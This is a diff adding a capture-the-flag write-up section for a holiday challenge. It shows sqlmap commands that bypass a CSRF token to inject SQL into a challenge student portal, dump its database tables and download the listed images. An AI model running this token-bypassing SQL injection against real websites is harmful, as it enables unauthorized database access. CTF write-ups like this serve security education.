@@ -1092,6 +1092,100 @@ image::main/08/10-email.png[Winner email]
 - And, as long as you're traveling around, be sure to solve any other challenges you happen across.
 ----
 
+=== 09 - Retrieve Scraps of Paper from Server
+
+Location: `Offline`
+
+Difficulty: `4/5`
+
+.Objective
+----
+Gain access to the data on the Student Portal server and retrieve the paper scraps hosted there. What is the name of Santa's cutting-edge sleigh guidance system? For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix.
+----
+
+==== Links
+
+* https://studentportal.elfu.org/[Elf University]
++
+image::main/09/00-website.png[]
+* https://mega.nz/#!wsx20ChA!_dLMsePbp28JTRAeqWrUq7dD9YrKRev8L-VwyMpOK_c[krampus-images.zip]
+** Copy of raw files required scraped from the database
++
+NOTE: SHA256: `57c6593afa23fa94c81cdea76c6f54f1d3ada760825d949e8fcd9f8d3c2e68f0`
+
+==== Solution
+
+. Look around website
+** Noticed form submits first reach out to `https://studentportal.elfu.org/validator.php` and retrieve a token
+*** The token behaves like a CSRF token
+*** The token is sent along with the form submission
+. Decided to test the application check form for SQL injection vulnerabilities
++
+[source, bash, options="nowrap"]
+----
+# https://studentportal.elfu.org/application-check.php?elfmail=EMAIL&token=CSRF_TOKEN
+[~]$ python sqlmap.py --tables -u 'https://studentportal.elfu.org/application-check.php?elfmail=EMAIL&token=CSRF_TOKEN' --eval='import requests; token=requests.get("https://studentportal.elfu.org/validator.php").text;'
+...
+Database: elfu
+[3 tables]
++---------------------------------------+
+| applications                          |
+| krampus                               |
+| students                              |
++---------------------------------------+
+...
+
+# Dump krampus table
+[~]$ python sqlmap.py --dump -T 'krampus' -u 'https://studentportal.elfu.org/application-check.php?elfmail=EMAIL&token=CSRF_TOKEN' --eval='import requests; token=requests.get("https://studentportal.elfu.org/validator.php").text;'
+...
++----+-----------------------+
+| id | path                  |
++----+-----------------------+
+| 1  | /krampus/0f5f510e.png |
+| 2  | /krampus/1cc7e121.png |
+| 3  | /krampus/439f15e6.png |
+| 4  | /krampus/667d6896.png |
+| 5  | /krampus/adb798ca.png |
+| 6  | /krampus/ba417715.png |
++----+-----------------------+
+...
+----
++
+. Download images
++
+[source, bash, options="nowrap"]
+----
+# Create a temp directory
+[~]$ cd "$(mktemp -d /tmp/ctf-09.XXX)"
+
+# Download images
+[/tmp/ctf-09.Ahk]$ curl -sOL 'https://studentportal.elfu.org/krampus/0f5f510e.png' ; \
+                   curl -sOL 'https://studentportal.elfu.org/krampus/1cc7e121.png' ; \
+                   curl -sOL 'https://studentportal.elfu.org/krampus/439f15e6.png' ; \
+                   curl -sOL 'https://studentportal.elfu.org/krampus/667d6896.png' ; \
+                   curl -sOL 'https://studentportal.elfu.org/krampus/adb798ca.png' ; \
+                   curl -sOL 'https://studentportal.elfu.org/krampus/ba417715.png' ;
+----
++
+. Piece images together
++
+image::main/09/01-finished.png[]
+
+*Answer:* `Super Sled-o-matic`
+
+==== Chat
+
+.Chat log
+----
+(Krampus - POST)
+- Wow! We’ve uncovered quite a nasty plot to destroy the holiday season.
+- We’ve gotta stop whomever is behind it!
+- I managed to find this protected document on one of the compromised machines in our environment.
+- I think our attacker was in the process of exfiltrating it.
+- I’m convinced that it is somehow associated with the plan to destroy the holidays. Can you decrypt it?
+- There are some smart people in the NetWars challenge room who may be able to help us.
+----
+
 == Side challenges
 
 === Escaping ED
